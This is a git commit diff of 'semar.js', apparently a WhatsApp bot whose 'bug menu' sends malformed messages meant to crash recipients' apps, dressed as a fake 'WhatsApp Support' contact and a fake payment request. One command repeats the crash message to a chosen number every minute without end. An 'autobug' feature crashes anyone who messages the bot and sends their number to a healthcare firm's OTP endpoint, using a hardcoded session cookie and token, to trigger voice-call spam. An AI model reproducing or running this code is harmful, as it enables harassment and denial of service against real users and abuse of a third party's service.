d9a2d622363c240d44de181a49d1809996e22b68
Denis Putra <76629978+dcode-denpa@users.noreply.github.com>
2022-11-10 21:52:06 +0700

    Add files via upload

--- semar.js
+++ semar.js
@@ -35,39 +35,11 @@ const isGroupAdmins = groupAdmins.includes(sender) || false
 const isSaya = botNumber.includes(senderNumber)
 const isDev = nomorDeveloper.includes(senderNumber) || isSaya
 const isOwner = nomorOwner.includes(senderNumber) || isSaya
-const reply = async(teks) => {await semar.sendMessage(from,{text: teks},{quoted:wrl})}
+const reply = async(teks) => {await semar.sendMessage(from,{text: teks})}
 const sleep = async (ms) => { return new Promise(resolve => setTimeout(resolve, ms))}
-const reactionMessage = require("@adiwajshing/baileys").proto.ReactionMessage.create({ key: msg.key, text: "" })
-const contactMessage = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"contactMessage": {"displayName": "WhatsApp Support","vcard": "BEGIN:VCARD\nVERSION:3.0\nN:Support;WhatsApp;;;\nFN:WhatsApp Support\nORG:WhatsApp Support\nTITLE:\nitem1.TEL;waid=0:+0\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-NAME:WhatsApp Support\nEND:VCARD"}}}
-
-//Fake Reply
-const wrl = {
-	key: {
-		remoteJid: '0@s.whatsapp.net',
-		fromMe: false,
-		id: 'Version',
-		participant: '0@s.whatsapp.net'
-	},
-	message: {
-		requestPaymentMessage: {
-			currencyCodeIso4217: "USD",
-			amount1000: 99999,
-			requestFrom: '0@s.whatsapp.net',
-			noteMessage: {
-				extendedTextMessage: {
-					text: '© Semar - BMD'
-				}
-			},
-			expiryTimestamp: 99999,
-			amount: {
-				value: 91929291929,
-				offset: 1000,
-				currencyCode: "USD"
-			}
-		}
-	}
-}
-//Batas
+const bugreactionMessage = require("@adiwajshing/baileys").proto.ReactionMessage.create({ key: msg.key, text: "" })
+const bugcontactMessage = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"contactMessage": {"displayName": "WhatsApp Support","vcard": "BEGIN:VCARD\nVERSION:3.0\nN:Support;WhatsApp;;;\nFN:WhatsApp Support\nORG:WhatsApp Support\nTITLE:\nitem1.TEL;waid=0:+0\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-NAME:WhatsApp Support\nEND:VCARD"}}}
+const frpayment = {key: {remoteJid: '0@s.whatsapp.net',fromMe: false,id: 'MultiDevice',participant: '0@s.whatsapp.net'},message: {requestPaymentMessage: {currencyCodeIso4217: "USD",amount1000: 2022,requestFrom: '0@s.whatsapp.net',noteMessage: {extendedTextMessage: {text: 'Copyright © 2022 Dcode Denpa, AI. Semar-BMD'}},expiryTimestamp: 2022,amount: {value: 91929291929,offset: 1000,currencyCode: "USD"}}}}
 
 const sendButMessage = (id, text1, footer1, but = [], options = {}) => {
 const buttonMessage = {text: text1, footer: footer1, buttons: but, headerType: 1}
@@ -82,12 +54,12 @@ const listMessage = {text: text1,footer: footer1,title: title1,buttonText: butto
 semar.sendMessage(id, listMessage, options)}
 
 if (body.startsWith(`64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61`)) { 
-semar.relayMessage(from, { reactionMessage }, { messageId: "crash" })
+semar.relayMessage(from, { bugreactionMessage }, { messageId: "crash" })
 requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61"}}}), { userJid: from })
 semar.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })}
 
 if (autobug && !isOwner && !command && !isGroup) { 
-semar.relayMessage(from, { reactionMessage }, { messageId: "crash" })
+semar.relayMessage(from, { bugreactionMessage }, { messageId: "crash" })
 axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`+${senderNumber}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {console.log(response)}).catch(function (error) {console.log(error)})}
 
 if (body && !isGroup && !msg.key.fromMe && !isDev) {
@@ -109,36 +81,37 @@ return reply(require('util').format(e))}}
 if (command) { await semar.readMessages([msg.key]) }
 if (!mode) { if (!isDev && !msg.key.fromMe) return }
 switch (command) {
-//Tampilan Menu
-case 'menu':
-reply(`
-❏  *OTHER MENU*
-       •  ${prefix}status
-       •  ${prefix}delete
+//©from:nathanael
+case 'menu': case 'help': case '?':
+semar.sendMessage(from,{text:`❏  *OTHER MENU*
+•   ${prefix}status
+•   ${prefix}delete
 
 ❏  *GROUP MENU*
-         •  ${prefix}open
-         •  ${prefix}close
-         •  ${prefix}add
-         •  ${prefix}kick
-         •  ${prefix}promote
-         •  ${prefix}demote
+•   ${prefix}open
+•   ${prefix}close
+•   ${prefix}add
+•   ${prefix}kick
+•   ${prefix}promote
+•   ${prefix}demote
          
 ❏  *BUG MENU*
-         •  ${prefix}sendbug
-         •  ${prefix}dumpbug
-         •  ${prefix}spambug
-         •  ${prefix}buggc
+•   ${prefix}sendbug
+•   ${prefix}dumpbug
+•   ${prefix}spambug
+•   ${prefix}buggc
          
 ❏  *OWNER MENU*
-         •  ${prefix}join
-         •  ${prefix}leave
-         •  ${prefix}restart
-         •  ${prefix}shutdown
-         •  ${prefix}public
-         •  ${prefix}self
-`)
+•   ${prefix}join
+•   ${prefix}leave
+•   ${prefix}restart
+•   ${prefix}shutdown
+•   ${prefix}public
+•   ${prefix}self
+•   ${prefix}chat
+•   ${prefix}autobug`}, {quoted:frpayment})
 break
+
 //©from: dennis
 case 'cek': case 'test': case 'status':
 exec(`pm2 status`, (error, stdout, stderr) => { reply(stdout)})
@@ -235,7 +208,7 @@ if (args[0].startsWith('8')) return reply(`Awali nomor dengan 62!\nContoh: ${pre
 if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}dumpbug ${senderNumber}`)
 if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim bug ke nomor developer!')
 if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
-semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: contactMessage })
+semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: bugcontactMessage })
 reply(`Sukses mengirim bug ke nomor ${dn}`)
 break
 
@@ -249,11 +222,11 @@ if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${pre
 if (args[0].startsWith(`${nomorDeveloper}`)) return reply('Tidak bisa mengirim bug ke nomor developer!')
 if (args[0].startsWith(`${botNumber}`)) return reply('Tidak bisa mengirim bug ke nomor ini!')
 reply('Berhasil mengirim 1 bug!')
-semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: contactMessage })
+semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: bugcontactMessage })
 reply('Loading 1Minutes...')
 function delay1Menit(i) { setTimeout(() => {
 reply(`Berhasil mengirim ${Number(i) + 2} bug!`)
-semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: contactMessage })
+semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: bugcontactMessage })
 delay1Menit(++i)}, 60000)}
 delay1Menit(0)
 break
